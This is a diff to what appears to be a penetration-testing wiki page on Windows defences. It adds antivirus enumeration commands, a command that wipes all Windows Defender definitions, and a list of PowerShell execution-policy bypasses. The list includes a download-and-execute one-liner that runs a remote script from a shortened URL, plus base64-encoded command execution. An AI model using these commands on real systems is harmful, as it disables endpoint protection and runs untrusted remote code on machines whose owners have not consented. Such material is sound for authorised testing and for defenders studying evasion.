@@ -110,10 +110,15 @@ NISEngineVersion                : 0.0.0.0
 </strong>RealTimeScanDirection           : 0
 PSComputerName                  :</code></pre>
 
-You could also run:
+To enumerate it you could also run:
 
 ```bash
-WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+wmic /namespace:\\root\securitycenter2 path antivirusproduc
+sc query windefend
+
+#Delete all rules of Defender (useful for machines without internet access)
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
 
 ## EFS (Encrypted File System)
@@ -186,6 +191,32 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```
 
 You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+
+## PS Execution Policy
+
+By default it is set to **restricted.** Main ways to bypass this policy:
+
+```powershell
+1º Just copy and paste inside the interactive PS console
+2º Read en Exec
+Get-Content .runme.ps1 | PowerShell.exe -noprofile -
+3º Read and Exec
+Get-Content .runme.ps1 | Invoke-Expression
+4º Use other execution policy
+PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
+5º Change users execution policy
+Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+6º Change execution policy for this session
+Set-ExecutionPolicy Bypass -Scope Process
+7º Download and execute:
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
+8º Use command switch
+Powershell -command "Write-Host 'My voice is my passport, verify me.'"
+9º Use EncodeCommand
+$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
+```
+
+More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 
 ## Security Support Provider Interface (SSPI)
 
